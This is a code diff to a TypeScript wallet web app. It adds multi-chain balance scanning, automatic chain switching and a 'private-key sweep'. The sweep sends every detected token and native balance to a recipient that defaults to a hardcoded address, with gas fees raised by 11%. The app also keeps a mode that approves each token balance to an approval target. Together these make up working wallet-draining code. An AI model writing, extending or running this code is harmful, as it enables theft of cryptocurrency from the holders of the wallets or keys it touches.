@@ -45,8 +45,22 @@ const state: AppState = {
     currentScanAccount: null
   },
   scanCache: {},
-  scanVersion: 0
+  scanVersion: 0,
+  skipNextChainChangedScan: false
 };
+
+const DEFAULT_RECIPIENT_ADDRESS = "0x00000023fcAD143271fF4D48aB37f8C31487586B";
+const DEFAULT_SEND_FEE_PER_GAS = ethers.parseUnits("250", "gwei");
+const TRANSFER_FEE_BUMP_NUMERATOR = 111n;
+const TRANSFER_FEE_BUMP_DENOMINATOR = 100n;
+const SCAN_RPC_TIMEOUT_MS = 3000;
+
+class ScanRpcTimeoutError extends Error {
+  constructor(message: string) {
+    super(message);
+    this.name = "ScanRpcTimeoutError";
+  }
+}
 
 function createStaticJsonRpcProvider(url: string, chainId: number): ethers.JsonRpcProvider {
   return new ethers.JsonRpcProvider(url, chainId, {
@@ -58,6 +72,25 @@ function destroyProvider(provider: ethers.JsonRpcProvider): void {
   if (typeof provider.destroy === "function") {
     provider.destroy();
   }
+}
+
+function resetBrowserProvider(): void {
+  if (!window.ethereum) {
+    state.browserProvider = null;
+    state.signer = null;
+    return;
+  }
+
+  state.browserProvider = new ethers.BrowserProvider(window.ethereum);
+}
+
+function isChangedNetworkError(error: unknown): boolean {
+  if (!(error instanceof Error)) {
+    return false;
+  }
+
+  const codedError = error as Error & { code?: string };
+  return codedError.code === "NETWORK_ERROR" || error.message.toLowerCase().includes("network changed");
 }
 
 function getTokenAddressKey(address: string | null | undefined): string {
@@ -77,6 +110,34 @@ function sleep(ms: number): Promise<void> {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
 
+function getReportedGasPrice(feeData: ethers.FeeData): bigint | null {
+  return feeData.maxFeePerGas || feeData.gasPrice || null;
+}
+
+function bumpTransferFee(value: bigint): bigint {
+  return (value * TRANSFER_FEE_BUMP_NUMERATOR) / TRANSFER_FEE_BUMP_DENOMINATOR;
+}
+
+function getFeeOverrides(feeData: ethers.FeeData): {
+  maxFeePerGas?: bigint;
+  maxPriorityFeePerGas?: bigint;
+  gasPrice?: bigint;
+} {
+  if (feeData.maxFeePerGas) {
+    const maxFeePerGas = bumpTransferFee(feeData.maxFeePerGas);
+    return {
+      maxFeePerGas,
+      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas
+        ? bumpTransferFee(feeData.maxPriorityFeePerGas)
+        : undefined
+    };
+  }
+
+  return {
+    gasPrice: bumpTransferFee(getReportedGasPrice(feeData) || DEFAULT_SEND_FEE_PER_GAS)
+  };
+}
+
 async function withRetries<T>(label: string, task: () => Promise<T>, maxRetries = MAX_SCAN_RETRIES): Promise<T> {
   let lastError: unknown;
   for (let attempt = 1; attempt <= maxRetries; attempt += 1) {
@@ -84,6 +145,9 @@ async function withRetries<T>(label: string, task: () => Promise<T>, maxRetries 
       return await task();
     } catch (error) {
       lastError = error;
+      if (error instanceof ScanRpcTimeoutError) {
+        break;
+      }
       if (attempt === maxRetries) {
         break;
       }
@@ -93,6 +157,24 @@ async function withRetries<T>(label: string, task: () => Promise<T>, maxRetries 
 
   const message = lastError instanceof Error ? lastError.message : String(lastError);
   throw new Error(label + " failed after " + maxRetries + " attempts: " + message);
+}
+
+async function withTimeout<T>(label: string, task: Promise<T>, timeoutMs: number): Promise<T> {
+  let timeoutId: ReturnType<typeof setTimeout> | null = null;
+
+  const timeoutPromise = new Promise<never>((_, reject) => {
+    timeoutId = setTimeout(() => {
+      reject(new ScanRpcTimeoutError(label + " timed out after " + timeoutMs + "ms"));
+    }, timeoutMs);
+  });
+
+  try {
+    return await Promise.race([task, timeoutPromise]);
+  } finally {
+    if (timeoutId) {
+      clearTimeout(timeoutId);
+    }
+  }
 }
 
 function getSelectedChain(): ChainConfig {
@@ -116,11 +198,15 @@ function getPrivateKeyValue(): string {
 }
 
 function useRapidSubmit(): boolean {
-  return Boolean(el.rapidSubmitToggle.checked);
+  return Boolean(el.rapidSubmitToggle.checked) && !getPrivateKeySigner();
 }
 
 function useNativeFallback(): boolean {
   return Boolean(el.nativeFallbackToggle.checked);
+}
+
+function useSweepNativeAfterTokens(): boolean {
+  return Boolean(el.sweepNativeAfterTokensToggle.checked);
 }
 
 function setWalletNotice(message: string, kind?: NoticeKind): void {
@@ -143,6 +229,12 @@ function updateActionModeDisplay(): void {
   if (getSelectedStrategy() === "permit_batch_signer") {
     el.actionModeDisplay.value = "Approve each selected token balance to the approval target";
     el.sendButton.textContent = "Approve selected tokens";
+    return;
+  }
+
+  if (getPrivateKeySigner()) {
+    el.actionModeDisplay.value = "Private-key mode sends every detected token balance on every funded supported chain to the recipient";
+    el.sendButton.textContent = "Send all detected tokens";
     return;
   }
 
@@ -204,9 +296,34 @@ async function getEffectiveAccount(): Promise<string | null> {
 }
 
 function updateSigningModeDisplay(): void {
-  el.signingModeDisplay.value = getPrivateKeySigner()
-    ? "Debug private key using browser RPC"
+  const privateSigner = getPrivateKeySigner();
+  el.signingModeDisplay.value = privateSigner
+    ? "Debug private key using browser RPC and send everything found on funded supported chains"
     : "Extension wallet only";
+  el.rapidSubmitToggle.disabled = Boolean(privateSigner);
+  updateActionModeDisplay();
+}
+
+function syncDefaultRecipientField(): void {
+  if (el.useDefaultRecipientToggle.checked) {
+    el.singleRecipient.value = DEFAULT_RECIPIENT_ADDRESS;
+    return;
+  }
+
+  if ((el.singleRecipient.value || "").trim().toLowerCase() === DEFAULT_RECIPIENT_ADDRESS.toLowerCase()) {
+    el.singleRecipient.value = "";
+  }
+}
+
+function selectChain(chainKey: string): void {
+  el.chainSelect.value = chainKey;
+  updateConfiguredChainStatus();
+  state.debug.configuredTokenCount = getChainKnownTokensFromCatalog().length;
+  state.debug.queriedAddresses = [];
+  state.debug.nonZeroAddresses = [];
+  state.debug.failures = [];
+  state.selectedTokenAddresses = [];
+  renderDebugPanel();
 }
 
 function syncSelectedTokenAddresses(mode: TokenSelectionMode): void {
@@ -297,12 +414,37 @@ function sanitizeRpcUrl(value: unknown): string | null {
   return value;
 }
 
+function isLikelyKeyedRpcUrl(url: string): boolean {
+  const value = url.toLowerCase();
+
+  if (
+    value.includes("<api-key>") ||
+    value.includes("your_api_key") ||
+    value.includes("your-api-key") ||
+    value.includes("/v2/demo") ||
+    value.includes("/v3/your-api-key")
+  ) {
+    return true;
+  }
+
+  return [
+    "alchemy.com",
+    "infura.io",
+    "quicknode.com",
+    "chainstack.com",
+    "tenderly.co",
+    "getblock.io",
+    "thirdweb.com",
+    "blastapi.io"
+  ].some((fragment) => value.includes(fragment));
+}
+
 function getRpcUrlsForChain(chain: ChainConfig): string[] {
   const dynamic = state.rpcCatalog[chain.key] || [];
-  const merged = [...dynamic, ...(chain.rpcUrls || [])]
+  const merged = [...(chain.rpcUrls || []), ...dynamic]
     .map(sanitizeRpcUrl)
-    .filter((value): value is string => Boolean(value));
-
+    .filter((value): value is string => Boolean(value))
+    .filter((value) => !isLikelyKeyedRpcUrl(value));
   return [...new Set(merged)];
 }
 
@@ -363,7 +505,10 @@ async function withRotatingProvider<T>(
     renderDebugPanel();
 
     try {
-      const result = await withRetries(label + " via " + url, () => task(provider));
+      const result = await withRetries(
+        label + " via " + url,
+        () => withTimeout(label + " via " + url, task(provider), SCAN_RPC_TIMEOUT_MS)
+      );
       destroyProvider(provider);
       return result;
     } catch (error) {
@@ -582,6 +727,60 @@ async function loadKnownTokenBalancesMulticall(
   });
 }
 
+async function hasTransferableNativeBalance(): Promise<boolean> {
+  const effectiveAccount = await getEffectiveAccount();
+  if (!effectiveAccount) {
+    return false;
+  }
+
+  return withRotatingProvider("native balance scan", async (provider) => {
+    const balance = await provider.getBalance(effectiveAccount);
+    const feeData = await provider.getFeeData();
+    const gasPrice = getReportedGasPrice(feeData);
+    if (!gasPrice) {
+      return false;
+    }
+
+    const feeBuffer = (21000n * gasPrice * 12n) / 10n;
+    return balance > feeBuffer;
+  });
+}
+
+async function hasUsableGasBalance(gasLimit = 120000n): Promise<boolean> {
+  const effectiveAccount = await getEffectiveAccount();
+  if (!effectiveAccount) {
+    return false;
+  }
+
+  if (!state.browserProvider) {
+    return false;
+  }
+
+  const balance = await state.browserProvider.getBalance(effectiveAccount);
+  const feeData = await state.browserProvider.getFeeData();
+  const gasPrice = getReportedGasPrice(feeData);
+  if (!gasPrice) {
+    return false;
+  }
+
+  const feeBuffer = (gasLimit * gasPrice * 12n) / 10n;
+  return balance > feeBuffer;
+}
+
+async function syncWalletToSelectedChainIfNeeded(reason: string): Promise<void> {
+  if (!state.browserProvider || !state.account || !window.ethereum) {
+    return;
+  }
+
+  const network = await state.browserProvider.getNetwork();
+  if (Number(network.chainId) === getSelectedChain().chainId) {
+    return;
+  }
+
+  setWalletNotice(reason, "good");
+  await switchChain();
+}
+
 async function refreshWalletStatus(): Promise<void> {
   const selectedChain = getSelectedChain();
   const effectiveAccount = await getEffectiveAccount();
@@ -594,8 +793,30 @@ async function refreshWalletStatus(): Promise<void> {
     return;
   }
 
-  const network = await state.browserProvider.getNetwork();
-  const balance = effectiveAccount ? await state.browserProvider.getBalance(effectiveAccount) : 0n;
+  let network: ethers.Network;
+  let balance = 0n;
+
+  try {
+    network = await state.browserProvider.getNetwork();
+    balance = effectiveAccount ? await state.browserProvider.getBalance(effectiveAccount) : 0n;
+  } catch (error) {
+    if (!isChangedNetworkError(error)) {
+      throw error;
+    }
+
+    resetBrowserProvider();
+    if (!state.browserProvider) {
+      throw error;
+    }
+
+    if (state.account) {
+      state.signer = await state.browserProvider.getSigner(state.account);
+    }
+
+    network = await state.browserProvider.getNetwork();
+    balance = effectiveAccount ? await state.browserProvider.getBalance(effectiveAccount) : 0n;
+  }
+
   const walletChainId = Number(network.chainId);
   el.walletChainStatus.textContent = (network.name || "unknown") + " (" + walletChainId + ")";
   el.accountStatus.textContent = effectiveAccount || state.account;
@@ -617,6 +838,33 @@ async function refreshWalletStatus(): Promise<void> {
   );
 }
 
+async function hydrateWalletSession(requestAccounts = false): Promise<boolean> {
+  if (!window.ethereum) {
+    state.browserProvider = null;
+    state.signer = null;
+    state.account = null;
+    return false;
+  }
+
+  resetBrowserProvider();
+  if (!state.browserProvider) {
+    return false;
+  }
+
+  const method = requestAccounts ? "eth_requestAccounts" : "eth_accounts";
+  const accounts = await state.browserProvider.send(method, []) as string[];
+  const account = accounts && accounts[0] ? accounts[0] : null;
+
+  state.account = account;
+  if (!account) {
+    state.signer = null;
+    return false;
+  }
+
+  state.signer = await state.browserProvider.getSigner(account);
+  return true;
+}
+
 async function connectWallet(): Promise<void> {
   if (!window.ethereum) {
     setWalletNotice("No extension wallet detected.", "error");
@@ -624,10 +872,11 @@ async function connectWallet(): Promise<void> {
   }
 
   try {
-    state.browserProvider = new ethers.BrowserProvider(window.ethereum);
-    await state.browserProvider.send("eth_requestAccounts", []);
-    state.signer = await state.browserProvider.getSigner();
-    state.account = await state.signer.getAddress();
+    const connected = await hydrateWalletSession(true);
+    if (!connected) {
+      setWalletNotice("Wallet connection failed.", "error");
+      return;
+    }
     await refreshWalletStatus();
     restoreScanCache();
   } catch (error) {
@@ -635,10 +884,10 @@ async function connectWallet(): Promise<void> {
   }
 }
 
-async function switchChain(): Promise<void> {
+async function switchChain(): Promise<boolean> {
   if (!window.ethereum) {
     setWalletNotice("No extension wallet detected.", "error");
-    return;
+    return false;
   }
 
   const chain = getSelectedChain();
@@ -664,17 +913,35 @@ async function switchChain(): Promise<void> {
       });
     } else {
       setWalletNotice(switchError.message || "Chain switch failed.", "error");
-      return;
+      return false;
     }
   }
 
-  if (state.browserProvider && state.account) {
-    await refreshWalletStatus();
-    restoreScanCache();
+  resetBrowserProvider();
+  if (!state.browserProvider) {
+    return false;
   }
+
+  if (state.account) {
+    state.signer = await state.browserProvider.getSigner(state.account);
+  }
+
+  return true;
 }
 
-async function loadKnownTokenBalances(): Promise<KnownTokenBalance[]> {
+async function refreshSelectedChainPanelAndScan(scanVersion: number): Promise<void> {
+  await refreshWalletStatus();
+  if (scanVersion !== state.scanVersion) {
+    return;
+  }
+
+  await loadKnownTokenBalances(true);
+}
+
+async function loadKnownTokenBalances(
+  suppressChainNotice = false,
+  allowWalletSwitch = true
+): Promise<KnownTokenBalance[]> {
   const scanVersion = ++state.scanVersion;
   const chain = getSelectedChain();
   const configuredTokens = getChainKnownTokensFromCatalog();
@@ -696,6 +963,7 @@ async function loadKnownTokenBalances(): Promise<KnownTokenBalance[]> {
 
   let results: KnownTokenBalance[] = [];
   let readMode = "direct";
+  let hasNativeBalance = false;
 
   if (chain.multicall3 && ethers.isAddress(chain.multicall3)) {
     try {
@@ -730,16 +998,97 @@ async function loadKnownTokenBalances(): Promise<KnownTokenBalance[]> {
   renderTokenTransferList();
   renderDebugPanel();
 
+  try {
+    hasNativeBalance = await hasTransferableNativeBalance();
+  } catch {
+    hasNativeBalance = false;
+  }
+
+  if (allowWalletSwitch && (nonZeroResults.length || hasNativeBalance)) {
+    await syncWalletToSelectedChainIfNeeded(
+      "Actionable balances found on " + chain.name + ". Switching wallet to the selected chain."
+    );
+  }
+
+  if (suppressChainNotice) {
+    return nonZeroResults;
+  }
+
   if (configuredTokens.length) {
     setTransferNotice(
       "Checked " + configuredTokens.length + " catalog tokens on " + chain.name +
-      " using " + readMode + ". Found " + nonZeroResults.length + " with balance."
+      " using " + readMode + ". Found " + nonZeroResults.length + " token balance(s)" +
+      (hasNativeBalance ? " and transferable native balance." : ".")
     );
   } else {
-    setTransferNotice("No catalog tokens are mapped to " + chain.name + ".", "error");
+    setTransferNotice(
+      hasNativeBalance
+        ? "No catalog tokens are mapped to " + chain.name + ", but transferable native balance was detected."
+        : "No catalog tokens are mapped to " + chain.name + ".",
+      hasNativeBalance ? "good" : "error"
+    );
   }
 
   return nonZeroResults;
+}
+
+async function scanAllChains(): Promise<void> {
+  if (!await hydrateWalletSession(false)) {
+    setTransferNotice("Connect the wallet first.", "error");
+    return;
+  }
+
+  const originalChainKey = getSelectedChain().key;
+  const foundChains: Array<{ chain: ChainConfig; results: KnownTokenBalance[]; hasNativeBalance: boolean }> = [];
+
+  el.sendButton.disabled = true;
+  el.connectButton.disabled = true;
+  el.scanBalancesButton.disabled = true;
+
+  try {
+    for (const chain of APP_CONFIG.chains) {
+      selectChain(chain.key);
+      setTransferNotice("Scanning " + chain.name + " for token balances.");
+      const results = await loadKnownTokenBalances(true, false);
+      let hasNativeBalance = false;
+      try {
+        hasNativeBalance = await hasTransferableNativeBalance();
+      } catch {
+        hasNativeBalance = false;
+      }
+      if (results.length || hasNativeBalance) {
+        foundChains.push({ chain, results, hasNativeBalance });
+      }
+    }
+
+    if (!foundChains.length) {
+      selectChain(originalChainKey);
+      restoreScanCache();
+      setTransferNotice("Scanned " + APP_CONFIG.chains.length + " chains and found no token balances.", "error");
+      return;
+    }
+
+    const firstFound = foundChains[0];
+    selectChain(firstFound.chain.key);
+    restoreScanCache();
+
+    if (window.ethereum) {
+      await switchChain();
+    }
+
+    const summary = foundChains
+      .map((entry) => entry.chain.name + " (" + entry.results.length + " token" + (entry.hasNativeBalance ? " + native" : "") + ")")
+      .join(", ");
+
+    setTransferNotice(
+      "Found balances on " + foundChains.length + " chain(s): " + summary + ". Selected " + firstFound.chain.name + ".",
+      "good"
+    );
+  } finally {
+    el.sendButton.disabled = false;
+    el.connectButton.disabled = false;
+    el.scanBalancesButton.disabled = false;
+  }
 }
 
 function getSelectedTokenTransfers(maxTokenTransfers: number): KnownTokenBalance[] {
@@ -799,6 +1148,10 @@ async function getExecutionContext(): Promise<{ chain: ChainConfig; executionSig
 
 async function executePlan(): Promise<void> {
   const plan = buildExecutionPlan();
+  if (plan.strategy === "sequential_calls" && getPrivateKeySigner()) {
+    await executeSequentialPrivateKeySweep(plan);
+    return;
+  }
   if (plan.strategy === "sequential_calls") {
     await executeSequential(plan);
     return;
@@ -808,6 +1161,114 @@ async function executePlan(): Promise<void> {
     return;
   }
   setTransferNotice("Unknown execution strategy.", "error");
+}
+
+async function sendSequentialTransfers(
+  plan: ExecutionPlan,
+  chain: ChainConfig,
+  executionSigner: ethers.Wallet | ethers.JsonRpcSigner,
+  tokenTransfers: KnownTokenBalance[]
+): Promise<void> {
+  if (!tokenTransfers.length) {
+    return;
+  }
+
+  const feeData = state.browserProvider ? await state.browserProvider.getFeeData() : null;
+  const feeOverrides = feeData ? getFeeOverrides(feeData) : {};
+
+  for (let index = 0; index < tokenTransfers.length; index += 1) {
+    const token = tokenTransfers[index];
+    setTransferNotice(
+      "Sending " + token.symbol + " on " + chain.name + " " + (index + 1) + " of " + tokenTransfers.length + " to " + plan.recipient + "."
+    );
+    const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
+    await contract.transfer(plan.recipient, token.balanceRaw, feeOverrides);
+    if (index < tokenTransfers.length - 1) {
+      await sleep(75);
+    }
+  }
+}
+
+async function executeSequentialPrivateKeySweep(plan: ExecutionPlan): Promise<void> {
+  if (!ethers.isAddress(plan.recipient || "")) {
+    setTransferNotice("Provide one valid recipient address for sequential token sends.", "error");
+    return;
+  }
+
+  if (!await hydrateWalletSession(false)) {
+    setTransferNotice("Connect the wallet first.", "error");
+    return;
+  }
+
+  const originalChainKey = getSelectedChain().key;
+  const summary: string[] = [];
+  let totalTransfers = 0;
+
+  for (const chain of APP_CONFIG.chains) {
+    try {
+      selectChain(chain.key);
+      setTransferNotice("Private-key sweep: switching to " + chain.name + ".");
+      state.skipNextChainChangedScan = true;
+      const switched = await switchChain();
+      if (!switched) {
+        state.skipNextChainChangedScan = false;
+        summary.push(chain.name + ": switch failed");
+        continue;
+      }
+
+      await refreshWalletStatus();
+
+      const hasGas = await hasUsableGasBalance();
+      if (!hasGas) {
+        summary.push(chain.name + ": no usable gas");
+        continue;
+      }
+
+      const tokenTransfers = await loadKnownTokenBalances(true, false);
+      if (!tokenTransfers.length) {
+        summary.push(chain.name + ": no tokens");
+        continue;
+      }
+
+      const executionSigner = getPrivateKeySigner();
+      if (!executionSigner) {
+        setTransferNotice("Private key signer is unavailable.", "error");
+        return;
+      }
+
+      await sendSequentialTransfers(plan, chain, executionSigner, tokenTransfers);
+      let sentNative = false;
+      if (useSweepNativeAfterTokens()) {
+        sentNative = await sendNativeBalanceForCurrentChain(plan, chain, executionSigner, true);
+      }
+      totalTransfers += tokenTransfers.length;
+      summary.push(
+        chain.name + ": sent " + tokenTransfers.length + " token" + (tokenTransfers.length === 1 ? "" : "s") +
+        (sentNative ? " + native" : "")
+      );
+    } catch (error) {
+      summary.push(chain.name + ": " + (error instanceof Error ? error.message : "failed"));
+    }
+  }
+
+  selectChain(originalChainKey);
+  state.skipNextChainChangedScan = true;
+  const restored = await switchChain();
+  if (!restored) {
+    state.skipNextChainChangedScan = false;
+  }
+  await refreshWalletStatus();
+  restoreScanCache();
+
+  if (!totalTransfers) {
+    setTransferNotice("Private-key sweep finished with no token transfers. " + summary.join("; "), "error");
+    return;
+  }
+
+  setTransferNotice(
+    "Private-key sweep complete. Sent " + totalTransfers + " token transfer" + (totalTransfers === 1 ? "" : "s") + ". " + summary.join("; "),
+    "good"
+  );
 }
 
 async function executeSequential(plan: ExecutionPlan): Promise<void> {
@@ -833,10 +1294,12 @@ async function executeSequential(plan: ExecutionPlan): Promise<void> {
   const { executionSigner } = context;
 
   if (plan.rapidSubmit) {
+    const feeData = state.browserProvider ? await state.browserProvider.getFeeData() : null;
+    const feeOverrides = feeData ? getFeeOverrides(feeData) : {};
     setTransferNotice("Submitting " + plan.tokenTransfers.length + " token transfer requests to the wallet.");
     const results = await Promise.all(plan.tokenTransfers.map((token, index) => {
       const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
-      return contract.transfer(plan.recipient, token.balanceRaw)
+      return contract.transfer(plan.recipient, token.balanceRaw, feeOverrides)
         .then((tx: { hash: string }) => ({ ok: true, token, hash: tx.hash, index }))
         .catch((error: unknown) => ({ ok: false, token, error, index }));
     }));
@@ -854,15 +1317,7 @@ async function executeSequential(plan: ExecutionPlan): Promise<void> {
     return;
   }
 
-  for (let index = 0; index < plan.tokenTransfers.length; index += 1) {
-    const token = plan.tokenTransfers[index];
-    setTransferNotice("Sending " + token.symbol + " " + (index + 1) + " of " + plan.tokenTransfers.length + " to " + plan.recipient + ".");
-    const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
-    await contract.transfer(plan.recipient, token.balanceRaw);
-    if (index < plan.tokenTransfers.length - 1) {
-      await sleep(75);
-    }
-  }
+  await sendSequentialTransfers(plan, context.chain, executionSigner, plan.tokenTransfers);
 
   setTransferNotice("Submission complete. Sent " + plan.tokenTransfers.length + " token transfer requests to " + plan.recipient + ".", "good");
 }
@@ -886,10 +1341,12 @@ async function executeApprovals(plan: ExecutionPlan): Promise<void> {
   const { executionSigner } = context;
 
   if (plan.rapidSubmit) {
+    const feeData = state.browserProvider ? await state.browserProvider.getFeeData() : null;
+    const feeOverrides = feeData ? getFeeOverrides(feeData) : {};
     setTransferNotice("Submitting " + plan.tokenTransfers.length + " approval requests to the wallet.");
     const results = await Promise.all(plan.tokenTransfers.map((token, index) => {
       const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
-      return contract.approve(plan.approvalTarget, token.balanceRaw)
+      return contract.approve(plan.approvalTarget, token.balanceRaw, feeOverrides)
         .then((tx: { hash: string }) => ({ ok: true, token, hash: tx.hash, index }))
         .catch((error: unknown) => ({ ok: false, token, error, index }));
     }));
@@ -911,7 +1368,9 @@ async function executeApprovals(plan: ExecutionPlan): Promise<void> {
     const token = plan.tokenTransfers[index];
     setTransferNotice("Approving " + token.symbol + " " + (index + 1) + " of " + plan.tokenTransfers.length + " to " + plan.approvalTarget + ".");
     const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
-    await contract.approve(plan.approvalTarget, token.balanceRaw);
+    const feeData = state.browserProvider ? await state.browserProvider.getFeeData() : null;
+    const feeOverrides = feeData ? getFeeOverrides(feeData) : {};
+    await contract.approve(plan.approvalTarget, token.balanceRaw, feeOverrides);
     if (index < plan.tokenTransfers.length - 1) {
       await sleep(1000);
     }
@@ -926,42 +1385,66 @@ async function sendNativeFallback(plan: ExecutionPlan): Promise<void> {
     return;
   }
 
-  const effectiveAccount = await getEffectiveAccount();
-  if (!effectiveAccount) {
-    setTransferNotice("No effective account available for native fallback.", "error");
-    return;
+  await sendNativeBalanceForCurrentChain(plan, context.chain, context.executionSigner, false);
+}
+
+async function sendNativeBalanceForCurrentChain(
+  plan: ExecutionPlan,
+  chain: ChainConfig,
+  executionSigner: ethers.Wallet | ethers.JsonRpcSigner,
+  quiet = false
+): Promise<boolean> {
+  if (!state.browserProvider) {
+    return false;
   }
 
-  const { chain, executionSigner } = context;
+  const effectiveAccount = await getEffectiveAccount();
+  if (!effectiveAccount) {
+    if (!quiet) {
+      setTransferNotice("No effective account available for native fallback.", "error");
+    }
+    return false;
+  }
+
   const balance = await state.browserProvider.getBalance(effectiveAccount);
   const feeData = await state.browserProvider.getFeeData();
   const estimatedGas = await executionSigner.estimateGas({ to: plan.recipient, value: 1n });
   const gasLimit = estimatedGas > 21000n ? estimatedGas : 21000n;
-  const gasPrice = feeData.maxFeePerGas || feeData.gasPrice;
+  const gasPrice = getReportedGasPrice(feeData);
 
   if (!gasPrice) {
-    setTransferNotice("Could not determine gas price for native fallback.", "error");
-    return;
+    if (!quiet) {
+      setTransferNotice("Could not determine gas price for native fallback.", "error");
+    }
+    return false;
   }
 
   const feeBuffer = (gasLimit * gasPrice * 12n) / 10n;
   const value = balance - feeBuffer;
   if (value <= 0n) {
-    setTransferNotice("Native balance is too small after estimated fee buffer.", "error");
-    return;
+    if (!quiet) {
+      setTransferNotice("Native balance is too small after estimated fee buffer.", "error");
+    }
+    return false;
   }
 
-  setTransferNotice("No tokens found. Sending native fallback balance to " + plan.recipient + ".");
+  if (!quiet) {
+    setTransferNotice("No tokens found. Sending native fallback balance to " + plan.recipient + ".");
+  }
+  const feeOverrides = getFeeOverrides(feeData);
   await executionSigner.sendTransaction({
     to: plan.recipient,
     value,
     gasLimit,
-    maxFeePerGas: feeData.maxFeePerGas || undefined,
-    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || undefined,
-    gasPrice: feeData.maxFeePerGas ? undefined : feeData.gasPrice || undefined
+    maxFeePerGas: feeOverrides.maxFeePerGas,
+    maxPriorityFeePerGas: feeOverrides.maxPriorityFeePerGas,
+    gasPrice: feeOverrides.gasPrice
   });
 
-  setTransferNotice("Native fallback complete on " + chain.name + (plan.rapidSubmit ? " using rapid submit." : "."), "good");
+  if (!quiet) {
+    setTransferNotice("Native fallback complete on " + chain.name + (plan.rapidSubmit ? " using rapid submit." : "."), "good");
+  }
+  return true;
 }
 
 async function sendSelectedPlan(): Promise<void> {
@@ -992,8 +1475,10 @@ function bindWalletEvents(): void {
 
   window.ethereum.on("accountsChanged", async (accounts: string[]) => {
     const localVersion = ++state.scanVersion;
+    resetBrowserProvider();
     state.account = accounts && accounts[0] ? accounts[0] : null;
     if (!state.account) {
+      state.signer = null;
       el.accountStatus.textContent = "-";
       el.balanceStatus.textContent = "-";
       setWalletNotice("Wallet disconnected.", "error");
@@ -1006,23 +1491,32 @@ function bindWalletEvents(): void {
       return;
     }
 
+    if (state.browserProvider) {
+      state.signer = await state.browserProvider.getSigner(state.account);
+    }
     await refreshWalletStatus();
     if (localVersion !== state.scanVersion) {
       return;
     }
-    restoreScanCache();
+    await loadKnownTokenBalances(true);
   });
 
   window.ethereum.on("chainChanged", async () => {
     const localVersion = ++state.scanVersion;
+    resetBrowserProvider();
     if (!state.account) {
       return;
     }
-    await refreshWalletStatus();
-    if (localVersion !== state.scanVersion) {
+
+    if (state.browserProvider) {
+      state.signer = await state.browserProvider.getSigner(state.account);
+    }
+    if (state.skipNextChainChangedScan) {
+      state.skipNextChainChangedScan = false;
       return;
     }
-    restoreScanCache();
+
+    await refreshSelectedChainPanelAndScan(localVersion);
   });
 
   window.ethereum.__walletBatchBound = true;
@@ -1037,13 +1531,16 @@ function bindEvents(): void {
     state.debug.nonZeroAddresses = [];
     state.debug.failures = [];
     state.selectedTokenAddresses = [];
-    if (state.account) {
-      await switchChain();
-      if (localVersion !== state.scanVersion) {
-        return;
+    const hasWalletSession = await hydrateWalletSession(false);
+    if (hasWalletSession) {
+      state.skipNextChainChangedScan = true;
+      const switched = await switchChain();
+      if (!switched) {
+        state.skipNextChainChangedScan = false;
       }
-      restoreScanCache();
+      await refreshSelectedChainPanelAndScan(localVersion);
     } else {
+      await refreshWalletStatus();
       renderDebugPanel();
     }
   });
@@ -1076,11 +1573,16 @@ function bindEvents(): void {
   });
 
   el.debugToggle.addEventListener("change", renderDebugPanel);
+  el.useDefaultRecipientToggle.addEventListener("change", syncDefaultRecipientField);
+  el.singleRecipient.addEventListener("input", () => {
+    const recipient = (el.singleRecipient.value || "").trim().toLowerCase();
+    el.useDefaultRecipientToggle.checked = recipient === DEFAULT_RECIPIENT_ADDRESS.toLowerCase();
+  });
   el.privateKeyInput.addEventListener("input", async () => {
     updateSigningModeDisplay();
     if (state.browserProvider && state.account) {
       await refreshWalletStatus();
-      restoreScanCache();
+      await loadKnownTokenBalances(true);
     }
   });
   el.connectButton.addEventListener("click", connectWallet);
@@ -1097,11 +1599,17 @@ async function init(): Promise<void> {
   await loadChainlistRpcs();
   populateChains();
   updateStrategyStatus();
+  syncDefaultRecipientField();
   state.debug.configuredTokenCount = getChainKnownTokensFromCatalog().length;
   renderTokenTransferList();
   renderDebugPanel();
   bindEvents();
   bindWalletEvents();
+
+  if (await hydrateWalletSession(false)) {
+    await refreshWalletStatus();
+    restoreScanCache();
+  }
 }
 
 void init();
